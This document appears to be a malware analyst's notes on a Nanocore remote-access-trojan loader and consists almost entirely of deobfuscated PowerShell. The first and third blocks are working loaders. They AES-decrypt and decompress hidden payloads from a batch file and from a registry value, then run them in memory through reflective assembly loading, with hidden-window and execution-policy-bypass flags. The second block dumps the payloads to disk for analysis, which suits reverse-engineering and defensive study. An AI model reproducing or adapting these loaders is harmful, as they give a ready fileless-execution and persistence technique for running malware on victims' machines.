### Nanocore Deobfuscated script

```ps
function Decrypt($ciphertext) {
	$AESObj=[System.Security.Cryptography.Aes]::Create();	
	$AESObj.Mode=[System.Security.Cryptography.CipherMode]::CBC;	
	$AESObj.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	
	$AESObj.Key=[convert]::FromBase64String('cZ0oCR9ckk8ylR37doxWSgpmHvZQk0eofx53d15npOg=');	
	$AESObj.IV=[convert]::FromBase64String('5LS/5s72ivLTO6XBqeLx6Q==');	
	$AES_DecryptObj=$AESObj.CreateDecryptor();	
	$return_var=$AES_DecryptObj.TransformFinalBlock($ciphertext, 0, $ciphertext.Length);	
	$AES_DecryptObj.Dispose();	
	$AESObj.Dispose();	
	$return_var;
}

function Decompress($ciphertext) {
	$MemoryStreamobj=New-Object System.IO.MemoryStream(,$ciphertext);	
	$DataCopiedTo=New-Object System.IO.MemoryStream;	
	$DecompressObj=New-Object System.IO.Compression.GZipStream($MemoryStreamobj, [IO.Compression.CompressionMode]::Decompress);	
	$DecompressObj.CopyTo($DataCopiedTo);	
	$DecompressObj.Dispose();	
	$MemoryStreamobj.Dispose();	
	$DataCopiedTo.Dispose();	
	$DataCopiedTo.ToArray();
}

function LoadPE($ciphertext,$Garbage) {
	$PEObj=[System.Reflection.Assembly]::Load([byte[]]$ciphertext);	
	$PE_Entrypoint=$PEObj.EntryPoint;	
	$PE_Entrypoint.Invoke($null, $Garbage);
}

$batchscript_data=[System.IO.File]::ReadAllText('tor_server.txt').Split([Environment]::NewLine);

foreach ($i in $batchscript_data) {
	if ($i.StartsWith(':: ')){
		$data_substr=$i.Substring(3);		
		break;	
	}
}

$data_substr_split=[string[]]$data_substr.Split('\');
$array1=Decompress (Decrypt ([convert]::FromBase64String($data_substr_split[0])));
$array2=Decompress (Decrypt ([convert]::FromBase64String($data_substr_split[1])));

LoadPE $array2 (,[string[]] (''));
LoadPE $array1 (,[string[]] (''));
```

### Nanocore Decryption Script

```ps
function Decrypt($ciphertext) {
	$AESObj=[System.Security.Cryptography.Aes]::Create();	
	$AESObj.Mode=[System.Security.Cryptography.CipherMode]::CBC;	
	$AESObj.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	
	$AESObj.Key=[convert]::FromBase64String('cZ0oCR9ckk8ylR37doxWSgpmHvZQk0eofx53d15npOg=');	
	$AESObj.IV=[convert]::FromBase64String('5LS/5s72ivLTO6XBqeLx6Q==');	
	$AES_DecryptObj=$AESObj.CreateDecryptor();	
	$return_var=$AES_DecryptObj.TransformFinalBlock($ciphertext, 0, $ciphertext.Length);	
	$AES_DecryptObj.Dispose();	
	$AESObj.Dispose();	
	$return_var;
}

function Decompress($ciphertext) {
	$MemoryStreamobj=New-Object System.IO.MemoryStream(,$ciphertext);	
	$DataCopiedTo=New-Object System.IO.MemoryStream;	
	$DecompressObj=New-Object System.IO.Compression.GZipStream($MemoryStreamobj, [IO.Compression.CompressionMode]::Decompress);	
	$DecompressObj.CopyTo($DataCopiedTo);	
	$DecompressObj.Dispose();	
	$MemoryStreamobj.Dispose();	
	$DataCopiedTo.Dispose();	
	$DataCopiedTo.ToArray();
}

function LoadPE($ciphertext,$Garbage) {
	$PEObj=[System.Reflection.Assembly]::Load([byte[]]$ciphertext);	
	$PE_Entrypoint=$PEObj.EntryPoint;	
	$PE_Entrypoint.Invoke($null, $Garbage);
}

$batchscript_data=[System.IO.File]::ReadAllText('tor_server.txt').Split([Environment]::NewLine);

foreach ($i in $batchscript_data) {
	if ($i.StartsWith(':: ')){
		$data_substr=$i.Substring(3);		
		break;	
	}
}

$data_substr_split=[string[]]$data_substr.Split('\');
$array1=Decompress (Decrypt ([convert]::FromBase64String($data_substr_split[0])));
$array2=Decompress (Decrypt ([convert]::FromBase64String($data_substr_split[1])));

[system.io.file]::writeallbytes("payload1.dll", $array1);
[system.io.file]::writeallbytes("payload2.dll", $array2);
```

### Deobfuscated Script stage 2 (Reads from Registry key)

```ps
"C:\Windows\$sxr-powershell.exe" -NoLogo -NoProfile -Noninteractive -WindowStyle hidden -ExecutionPolicy bypass -Command 

function Decrypt($ciphertext){
	$AESObject=[System.Security.Cryptography.Aes]::Create();
	$AESObject.Mode=[System.Security.Cryptography.CipherMode]::CBC;
	$AESObject.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
	$AESObject.Key=[System.Convert]::FromBase64String('JD/v+7dssRDznVgXQ97ITB/BVSExZO9VPkGd/fyJxEI=');
	$AESObject.IV=[System.Convert]::FromBase64String('NmWUEgmahqRvNKOPh7I3ng==');
	$Decryptor=$AESObject.CreateDecryptor();
	$PlainText=$Decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length);
	$Decryptor.Dispose();
	$AESObject.Dispose();
	$PlainText;
}

function DecompressGzip($ciphertext){	
	$memstream=New-Object System.IO.MemoryStream(,$ciphertext);
	$memstream2=New-Object System.IO.MemoryStream;
	$Decompression=New-Object System.IO.Compression.GZipStream($memstream, [IO.Compression.CompressionMode]::Decompress);
	$Decompression.CopyTo($memstream2);
	$Decompression.Dispose();
	$memstream.Dispose();
	$memstream2.Dispose();
	$memstream2.ToArray();
}

function LoadPE($ciphertext,$nXUBO){
	$LoadAssembly=[System.Reflection.Assembly]::Load([byte[]]$ciphertext);
	$AssemblyEntryPoint=$LoadAssembly.EntryPoint;
	$AssemblyEntryPoint.Invoke($null, $nXUBO);
}

$AESObject1 = New-Object System.Security.Cryptography.AesManaged;
$AESObject1.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$AESObject1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$AESObject1.Key = [System.Convert]::FromBase64String('JD/v+7dssRDznVgXQ97ITB/BVSExZO9VPkGd/fyJxEI=');
$AESObject1.IV = [System.Convert]::FromBase64String('NmWUEgmahqRvNKOPh7I3ng==');
$Decryptor2 = $AESObject1.CreateDecryptor();
$Decrypted = [System.Convert]::FromBase64String('kLxpCEdGhgY75m1fIEa8mA==');
$Decrypted = $Decryptor2.TransformFinalBlock($Decrypted, 0, $Decrypted.Length);
$Decrypted = [System.Text.Encoding]::UTF8.GetString($Decrypted);
$Decrypted2 = [System.Convert]::FromBase64String('FfqW7gj6L8eIOvwQnUgyaAXzfx0t9ZKhxFXx9+ClpJ0=');
$Decrypted2 = $Decryptor2.TransformFinalBlock($Decrypted2, 0, $Decrypted2.Length);
$Decrypted2 = [System.Text.Encoding]::UTF8.GetString($Decrypted2);
$Decrypted3 = [System.Convert]::FromBase64String('px7Ye88h/QPHVOQpgp07sw==');
$Decrypted3 = $Decryptor2.TransformFinalBlock($Decrypted3, 0, $Decrypted3.Length);
$Decrypted3 = [System.Text.Encoding]::UTF8.GetString($Decrypted3);
$Decrypted4 = [System.Convert]::FromBase64String('stpJWitHFxarUFrghAP4hoy+yYR0JDRiJY99M15/N5z7BKbSY9aAEZ6dhJBZ0IXFAoYVR+xU8QcwJFJ+b2dyCvFZXhGMycThXnszQ/tU6dYD1w+/zAkReuPqweNTab2KadTWV6SnSR0lsT54Apxu5gH6x6o+aEq9e1B63zZNGS2BCp2pV4QwtA/Q48ddxHYy6IJDfaQ2xuAPS/pMuu8ZVS9WXKG3UfUottxDOaCYqmeQOHq1U2Cd+IHpHQGesHUKFSkl/QvWvrjFNDcSRYRzGwJ4NzpFJLgmCMo9OcSI7o1BnZfWb3ND9N6mqH/WU+yWxWSG+U23i8e+g3K71ru30kqi2E3zIrCJz73M2GUMn5dMTZwI/R4bXUrqAmLtQ25K/+7lSXypJEPtSs6ROnltJX2PuGtFgsUoRqrX2rF3yFg=');
$Decrypted4 = $Decryptor2.TransformFinalBlock($Decrypted4, 0, $Decrypted4.Length);
$Decrypted4 = [System.Text.Encoding]::UTF8.GetString($Decrypted4);
$Decrypted5 = [System.Convert]::FromBase64String('yqNnNNz+oLwKC7/UuHPXlQ==');
$Decrypted5 = $Decryptor2.TransformFinalBlock($Decrypted5, 0, $Decrypted5.Length);
$Decrypted5 = [System.Text.Encoding]::UTF8.GetString($Decrypted5);
$Decrypted6 = [System.Convert]::FromBase64String('8CCqpvpoXxWu3DXZMIHVBA==');
$Decrypted6 = $Decryptor2.TransformFinalBlock($Decrypted6, 0, $Decrypted6.Length);
$Decrypted6 = [System.Text.Encoding]::UTF8.GetString($Decrypted6);
$Decrypted7 = [System.Convert]::FromBase64String('czI7e6y1HN2ScxUTVTaSZw==');
$Decrypted7 = $Decryptor2.TransformFinalBlock($Decrypted7, 0, $Decrypted7.Length);
$Decrypted7 = [System.Text.Encoding]::UTF8.GetString($Decrypted7);
$Decrypted8 = [System.Convert]::FromBase64String('70CLQGApbMS8CZhvQrZsIQ==');
$Decrypted8 = $Decryptor2.TransformFinalBlock($Decrypted8, 0, $Decrypted8.Length);
$Decrypted8 = [System.Text.Encoding]::UTF8.GetString($Decrypted8);
$Decrypted9 = [System.Convert]::FromBase64String('u06HVhN4FILQJsZNQDZ7+g==');
$Decrypted9 = $Decryptor2.TransformFinalBlock($Decrypted9, 0, $Decrypted9.Length);
$Decrypted9 = [System.Text.Encoding]::UTF8.GetString($Decrypted9);
$Decrypted0 = [System.Convert]::FromBase64String('tfTFYFG4YXI7+FsDMKes0A==');
$Decrypted0 = $Decryptor2.TransformFinalBlock($Decrypted0, 0, $Decrypted0.Length);
$Decrypted0 = [System.Text.Encoding]::UTF8.GetString($Decrypted0);
$Decrypted1 = [System.Convert]::FromBase64String('dWN5klnJdLshB+JVdNUIOw==');
$Decrypted1 = $Decryptor2.TransformFinalBlock($Decrypted1, 0, $Decrypted1.Length);
$Decrypted1 = [System.Text.Encoding]::UTF8.GetString($Decrypted1);
$Decrypted2 = [System.Convert]::FromBase64String('0gdLPlQXB04rB6HHxH6pMQ==');
$Decrypted2 = $Decryptor2.TransformFinalBlock($Decrypted2, 0, $Decrypted2.Length);
$Decrypted2 = [System.Text.Encoding]::UTF8.GetString($Decrypted2);
$Decrypted3 = [System.Convert]::FromBase64String('GFtVX+aOQQdpYYvTbywtWQ==');
$Decrypted3 = $Decryptor2.TransformFinalBlock($Decrypted3, 0, $Decrypted3.Length);
$Decrypted3 = [System.Text.Encoding]::UTF8.GetString($Decrypted3);
$Decryptor2.Dispose();
$AESObject1.Dispose();
$OpenRegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubkey(SOFTWARE).GetValue(Load);
$OpenRegKey=[string[]]$OpenRegKey.Split('\');
$Decompress=DecompressGzip(Decrypt([System.Convert]::FromBase64String($OpenRegKey[1])));
LoadPE $Decompress (,[string[]] ('%*'));

$DecryptRegKey = [System.Convert]::FromBase64String($OpenRegKey[0]);
$AESObject = New-Object System.Security.Cryptography.AesManaged;
$AESObject.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$AESObject.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$AESObject.Key = [System.Convert]::FromBase64String('JD/v+7dssRDznVgXQ97ITB/BVSExZO9VPkGd/fyJxEI=');
$AESObject.IV = [System.Convert]::FromBase64String('NmWUEgmahqRvNKOPh7I3ng==');
$Decryptor = $AESObject.CreateDecryptor();
$DecryptRegKey = $Decryptor.TransformFinalBlock($DecryptRegKey, 0, $DecryptRegKey.Length);
$Decryptor.Dispose();
$AESObject.Dispose();
$memstream = New-Object System.IO.MemoryStream(, $DecryptRegKey);
$memstream2 = New-Object System.IO.MemoryStream;
$Decompression = New-Object System.IO.Compression.GZipStream($memstream, [IO.Compression.CompressionMode]::$Decrypted1);
$Decompression.$Decrypted9($memstream2);
$Decompression.Dispose();
$memstream.Dispose();
$memstream2.Dispose();
$Array1 = $memstream2.ToArray();
$LoadAssembly = [System.Reflection.Assembly]::Load($Array1);
$AssemblyEntryPoint = $LoadAssembly.EntryPoint;
$AssemblyEntryPoint.$Decrypted0($null, '$sxr-powershell')
```
